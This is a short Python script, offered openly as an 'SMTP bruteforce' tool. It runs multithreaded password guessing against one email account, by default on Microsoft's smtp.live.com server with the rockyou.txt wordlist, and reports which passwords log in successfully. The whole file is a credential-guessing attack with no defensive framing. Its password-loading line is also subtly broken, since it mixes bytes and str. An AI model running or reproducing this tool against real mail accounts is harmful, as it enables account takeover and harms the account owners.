#!/usr/bin/env python3
#-*-coding:utf-8-*-

try:
    import argparse,queue,smtplib,sys,threading
except ImportError as err:
    print(err)

def run(smtp,port,mail,passwords):
    while not passwords.empty():
        temp_password = passwords.get()
        try:
            server = smtplib.SMTP(smtp,port)
            server.starttls() # use smtplib.ehlo() automatically
            server.login(mail,temp_password) # use smtplib.ehlo() automatically
            server.quit()
            print("[*] Attempting with",mail,"and",temp_password,"success")
        except smtplib.SMTPAuthenticationError:
            print("[*] Attempting with",mail,"and",temp_password,"failed")
        except smtplib.SMTPException as err:
            print(err)

parser = argparse.ArgumentParser(description="**** SMTP bruteforce ****")
parser.add_argument("-s","--smtp",type=str,action="store",default="smtp.live.com",help="Use -s,--smtp as the mail server.")
parser.add_argument("-p","--port",type=int,action="store",default=25,help="Use -p,--port as the mail server port.")
parser.add_argument("-m","--mail",type=str,action="store",default="",help="Use -m,--mail as the mail address.")
parser.add_argument("-f","--file",type=str,action="store",default="/usr/share/wordlists/rockyou.txt",help="Use -f,--file as the password passwords.")
parser.add_argument("-n","--num",type=int,action="store",default=50,help="Use -n,--num as the number of threads.")
args = parser.parse_args()

try:
    passwords = queue.Queue()
    with open(args.file,"rb") as file_stream:
        for line in file_stream:
            passwords.put(line.rstrip("\n"))
    for i in range(0,args.num):
        thread = threading.Thread(target=run, args=(args.smtp,args.port,args.mail,passwords))
        thread.start()
except IOError as err:
    print(err)
